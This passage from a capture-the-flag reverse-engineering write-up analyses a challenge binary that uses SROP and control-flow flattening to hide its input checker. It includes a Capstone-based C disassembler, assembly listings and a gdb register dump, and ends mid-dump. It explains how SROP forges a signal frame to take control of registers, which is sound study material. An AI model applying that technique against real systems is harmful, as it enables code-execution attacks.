program\u0026rsquo;s logic is in program.bin.\u003c/p\u003e\n\u003cp\u003eFinally, we can see that we have a syscall at the end of main. Looking at the assembly code more closely, we can get more information:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-asm\" data-lang=\"asm\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eMOV\u003c/span\u003e        \u003cspan style=\"color:#66d9ef\"\u003eRSP\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e0x42420000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eMOV\u003c/span\u003e        \u003cspan style=\"color:#66d9ef\"\u003eRAX\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e0xf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eSYSCALL\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eRSP now contains the address 0x42420000 and the syscall number is 0xf, which corresponds to the syscall: rt_sigreturn.\u003c/p\u003e\n\u003cp\u003eSearching a bit on the internet and with the help of the challenge title, we come across an exploitation technique called SROP.\u003c/p\u003e\n\u003cp\u003eThis technique abuses signal handling under Linux/Unix.\u003c/p\u003e\n\u003ch2 id=\"description-of-srop\"\u003eDescription of SROP\u003c/h2\u003e\n\u003cp\u003eFirst, we need to understand how signal handling works under Linux.\u003c/p\u003e\n\u003cp\u003eWhen a process receives a signal (SIGSEGV, SIGINT\u0026hellip;), it proceeds as follows:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eThe kernel saves the context, i.e., all registers and flags.\u003c/li\u003e\n\u003cli\u003eA signal handler executes.\u003c/li\u003e\n\u003cli\u003eReturn to the program via the sigreturn syscall (syscall 15) which restores all registers from the stack.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eSROP abuses this system by forging a fake signal frame representing the context and then calling the sigreturn syscall. Thus, the program resumes with the fake frame, with register values that we control.\u003c/p\u003e\n\u003cp\u003eThe fake signal frame looks like this:\n![[frame.png]]\u003c/p\u003e\n\u003ch2 id=\"extracting-the-real-program\"\u003eExtracting the Real Program\u003c/h2\u003e\n\u003cp\u003eOur program here uses the SROP technique to execute the real program, which verifies our input.\u003c/p\u003e\n\u003cp\u003eHere, the memory region starting at 0x13370000 contains the code that will be executed, the memory region 0x42420000 contains the fake stack frame, and 0xcafe0000 is likely used as a memory region for the SROP program.\u003c/p\u003e\n\u003cp\u003eTo understand what our program really does, I wrote a C program to extract from program.bin the code present at 0x13370000, using the same principle as the pors program to parse it:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-C\" data-lang=\"C\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#include\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e\u0026lt;stdio.h\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#include\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e\u0026lt;stdlib.h\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#include\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e\u0026lt;inttypes.h\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#include\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e\u0026lt;string.h\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#include\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e\u0026lt;capstone/capstone.h\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eget_code_section\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eunsigned\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003echar\u003c/span\u003e buf[], \u003cspan style=\"color:#66d9ef\"\u003econst\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e buf_size)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  csh handle;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  cs_insn \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003einsn;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003esize_t\u003c/span\u003e count;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003ecs_open\u003c/span\u003e(CS_ARCH_X86, CS_MODE_64, \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003ehandle) \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e CS_ERR_OK) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e EXIT_FAILURE;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  count \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecs_disasm\u003c/span\u003e(handle, buf, buf_size\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x13370000\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003einsn);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (count \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003esize_t\u003c/span\u003e i;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e (i \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e; i \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e count; i\u003cspan style=\"color:#f92672\"\u003e++\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#a6e22e\"\u003eprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;0x%\u0026#34;\u003c/span\u003ePRIx64\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;:\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\t\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%s\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\t\\t\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%s\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e, insn[i].address, insn[i].mnemonic,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e             insn[i].op_str);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Error: Failed to disassemble given code!\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e EXIT_FAILURE;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e EXIT_SUCCESS;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e argc, \u003cspan style=\"color:#66d9ef\"\u003echar\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003eargv[])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  FILE\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e file;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003euint32_t\u003c/span\u003e size;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  file \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efopen\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;program.bin\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;rb\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (\u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003efile) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Erreur ouverture fichier\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003efread\u003c/span\u003e(\u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003esize, \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e, file);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eunsigned\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003echar\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003ebuf \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emalloc\u003c/span\u003e(size);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003efread\u003c/span\u003e(buf, \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e , size, file);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003eprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%d\u0026#34;\u003c/span\u003e, size);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eget_code_section\u003c/span\u003e(buf, size)) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eprintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Error disassembling code section !\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003efclose\u003c/span\u003e(file);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003efree\u003c/span\u003e(buf);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e EXIT_SUCCESS;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eThis displays several blocks separated by garbage code:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-asm\" data-lang=\"asm\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003ex13370000:\t\u003cspan style=\"color:#a6e22e\"\u003emov\u003c/span\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003erax\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003erdx\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003ex13370003:\t\u003cspan style=\"color:#a6e22e\"\u003eadd\u003c/span\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003erax\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003ex13370007:\t\u003cspan style=\"color:#a6e22e\"\u003eimul\u003c/span\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003erax\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003erax\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0xf8\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003ex1337000e:\t\u003cspan style=\"color:#a6e22e\"\u003eadd\u003c/span\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ersp\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003erax\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003ex13370011:\t\u003cspan style=\"color:#a6e22e\"\u003emov\u003c/span\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003erax\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0xf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003ex13370018:\t\u003cspan style=\"color:#a6e22e\"\u003esyscall\u003c/span\u003e\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e...\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003ex13370050:\t\u003cspan style=\"color:#a6e22e\"\u003esyscall\u003c/span\u003e\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x13370052\u003c/span\u003e:\t\u003cspan style=\"color:#66d9ef\"\u003emov\u003c/span\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ersp\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x42420000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003ex13370059:\t\u003cspan style=\"color:#a6e22e\"\u003emov\u003c/span\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003eqword\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eptr\u003c/span\u003e [\u003cspan style=\"color:#66d9ef\"\u003ersp\u003c/span\u003e \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0x88\u003c/span\u003e], \u003cspan style=\"color:#ae81ff\"\u003e0x40\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003ex13370065:\t\u003cspan style=\"color:#a6e22e\"\u003emov\u003c/span\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003erax\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0xf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003ex1337006c:\t\u003cspan style=\"color:#a6e22e\"\u003esyscall\u003c/span\u003e\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e...\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003ex133700a0:\t\u003cspan style=\"color:#a6e22e\"\u003ecmp\u003c/span\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003edword\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eptr\u003c/span\u003e [\u003cspan style=\"color:#66d9ef\"\u003ersp\u003c/span\u003e \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e], \u003cspan style=\"color:#66d9ef\"\u003eeax\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003ex133700a4:\t\u003cspan style=\"color:#a6e22e\"\u003emov\u003c/span\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ersp\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x42420000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003ex133700ab:\t\u003cspan style=\"color:#a6e22e\"\u003emov\u003c/span\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003erax\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x2d\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003ex133700b2:\t\u003cspan style=\"color:#a6e22e\"\u003emov\u003c/span\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003erbx\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0x21\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003ex133700b9:\t\u003cspan style=\"color:#a6e22e\"\u003ecmovl\u003c/span\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003erax\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003erbx\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003ex133700bd:\t\u003cspan style=\"color:#a6e22e\"\u003emov\u003c/span\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003eqword\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eptr\u003c/span\u003e [\u003cspan style=\"color:#66d9ef\"\u003ersp\u003c/span\u003e \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0x88\u003c/span\u003e], \u003cspan style=\"color:#66d9ef\"\u003erax\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003ex133700c5:\t\u003cspan style=\"color:#a6e22e\"\u003emov\u003c/span\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003erax\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0xf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e0\u003c/span\u003ex133700cc:\t\u003cspan style=\"color:#a6e22e\"\u003esyscall\u003c/span\u003e\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eetc\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eLooking at the structure more closely, we can see that the program using SROP adds a layer of obfuscation, specifically Control Flow Flattening (CFF). Indeed, we can see that RSP is always filled with the address 0x42420000 and that the sigreturn syscall is called at the end of each block, which means that each block returns to the first block which handles dispatching to the next block. This is how CFF works. We can verify this with gdb:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-asm\" data-lang=\"asm\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e$rax\u003c/span\u003e   : \u003cspan style=\"color:#ae81ff\"\u003e0x0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e$rbx\u003c/span\u003e   : \u003cspan style=\"color:#ae81ff\"\u003e0x0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e$rcx\u003c/span\u003e   : \u003cspan style=\"color:#ae81ff\"\u003e0x0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e$rdx\u003c/span\u003e   : \u003cspan style=\"color:#ae81ff\"\u003e0x0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e$rsp\u003c/span\u003e   : \u003cspan style=\"color:#ae81ff\"\u003e0x0000000042420000\u003c/span\u003e  \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e\u003c/span\u003e  \u003cspan style=\"color:#ae81ff\"\u003e0x0000000000000000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e$rbp\u003c/span\u003e   : \u003cspan style=\"color:#ae81ff\"\u003e0x0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e$rsi\u003c/span\u003e   : \u003cspan style=\"color:#ae81ff\"\u003e0x0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e$rdi\u003c/span\u003e   : \u003cspan 